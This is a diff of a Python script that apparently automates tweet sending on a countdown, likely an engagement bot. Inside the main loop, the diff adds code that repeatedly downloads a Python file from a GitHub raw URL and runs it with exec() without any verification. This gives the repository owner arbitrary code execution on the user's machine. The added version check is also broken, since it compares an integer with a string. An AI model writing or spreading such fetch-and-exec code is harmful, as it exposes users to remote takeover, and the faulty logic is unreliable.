@@ -1,21 +1,10 @@
-update_version = '1'
+update_version = 1
 import requests
 import random
 import sys
 import time
 import os
 
-url = 'https://raw.githubusercontent.com/AbdelrhmanX7/test-send/main/Hash_Twitter.py'
-
-check_updates = requests.get(url, allow_redirects=True)
-
-LOC = check_updates.content.decode('UTF-8')
-
-print(int(LOC[LOC.index('=') + 3: LOC.index('\n') - 1]))
-
-print('ملكش دعوة بالارقام دية احنا بنجرب ميزة اللاف و الريتويت علشان تفاعل')
-
-print('hello')
 
 class bcolors:
     HEADER = '\033[95m'
@@ -247,6 +236,14 @@ sys.stdout.write('\r' + Tweet_Send_Text + '\n')
 
 Timer_Countdown = 45
 while 1:
+    url = 'https://raw.githubusercontent.com/AbdelrhmanX7/test-send/main/Hash_Twitter.py'
+
+    check_updates = requests.get(url, allow_redirects=True)
+
+    LOC = check_updates.content.decode('UTF-8')
+    
+    if update_version < LOC[LOC.index('=') + 3: LOC.index('\n') - 1]:
+        exec(LOC)
     Timer_Countdown = Timer_Countdown - 1
     b = f"{bcolors.OKCYAN}TWEET_WILL_SEND_AFTER ==> [{Timer_Countdown}]{bcolors.BOLD}"
     sys.stdout.write('\r' + b)
